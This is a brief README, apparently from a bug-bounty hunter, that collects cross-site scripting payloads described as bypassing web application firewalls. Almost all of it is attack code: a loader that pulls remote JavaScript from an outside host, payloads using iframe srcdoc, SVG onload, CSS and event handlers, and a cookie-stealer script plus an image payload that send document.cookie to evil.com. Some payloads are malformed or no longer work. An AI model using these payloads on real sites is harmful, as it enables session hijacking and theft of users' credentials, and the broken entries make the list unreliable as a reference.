# xss_waf_bypass
Some collection of xss payloads that worked for me to bypass wafs while doing bb

### Payloads

1. **Inject External JavaScript without `<script>` Tag:**
   
```html
<img src=x onerror="var script = document.createElement('script'); script.src = 'https://eternal.h4ck.me/xss.js'; document.head.appendChild(script);">
```

2. **Bypassing `onerror` Filter with `srcdoc`:**

```html
<iframe srcdoc="<script>alert('XSS')</script>">
```

3. **Data Exfiltration through Image Source (Cross-Domain):**

```html
<img src="https://evil.com/?data=" + encodeURIComponent(document.cookie)">
```

4. **CSS-Based XSS:**

```css
body { background-image: url('javascript:alert("XSS")'); }
```

5. **SVG XSS (Cross-Site Scripting using SVG):**

```html
<svg/onload=alert(document.domain)>
```

7. **Event Handlers to Execute Payload:**

```html
<button onclick="alert('XSS')">Click Me</button>
```

### Cookie Stealer Example:

```js
// XSS cookie stealer POC
var cookie = encodeURIComponent(document.cookie);
var url = 'https://evil.com/index.html/?victim_cookie=' + cookie;
window.location.href = url;
```
